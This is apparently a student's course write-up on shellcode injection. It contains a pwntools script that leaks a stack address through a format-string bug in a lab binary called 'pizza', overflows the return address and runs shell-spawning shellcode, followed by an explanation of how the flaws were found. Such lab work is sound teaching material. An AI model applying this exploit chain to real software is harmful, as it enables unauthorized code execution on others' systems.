# Week 10 - Shellcode Injection




This week we learned about how to use shellcode by finding and injecting it into vulnerable programs.




---

## Code

1) A code block containing your assembly instructions for your shellcode

```
#!/usr/bin/env python3

from pwn import *

elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

shellcode = asm(shellcraft.amd64.linux.sh())

input1 = b"Cantinflas %p %p %p %p %p %p %p"
input2 = b"10"

victim = process("./pizza")

print(str(victim.recvline(), "latin-1"))
victim.sendline(input1)

leak = str(victim.recvline(), "latin-1").split()[-1]
shellcode_place = int(leak, 16) + 0x20
print(str(victim.recvline(), "latin-1"))
victim.sendline(input2)

input3 = b"A" * 136 + p64(shellcode_place) + shellcode
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
victim.sendline(input3)

victim.interactive()
core = victim.corefile
rsp = core.rsp
rbp = core.rbp
rip = core.rip

top_of_stack = core.read(rsp, 8)
stack_1 = core.read(rsp + 8, 8)
stack_2 = core.read(rsp + 16, 8)

print(f"rsp = {hex(rsp)}")
print(f"rbp = {hex(rbp)}")
print(f"rip = {hex(rip)}")
print(f"Top of stack contains {hex(int.from_bytes(top_of_stack, 'little'))}")
print(f"Stack + 1 contains {hex(int.from_bytes(stack_1, 'little'))}")
print(f"Stack + 2 contains {hex(int.from_bytes(stack_2, 'little'))}")
print(f"Shellcode location {hex(shellcode_place)}")
```

This code injects some shellcode into a vulnerable executable called pizza. It starts by finding the location of the stack using a memory leak found in the first prompt. We found this when we experimented with inputs and found that %p leaked values some of which looked like addresses. It then uses the next input to write the shellcode on the stack and overwrite the return address. We found this vulnerability by noticing a stack overflow when we put a lot of input in the second prompt. And then by exploring the corefile we can see that the overflow is overwriting the return address. With more exploration we found the number of bytes needed to reach the address. This allows us to construct an input with our shellcode address replacing the return address. This then allows us to take over the program with our shellcode.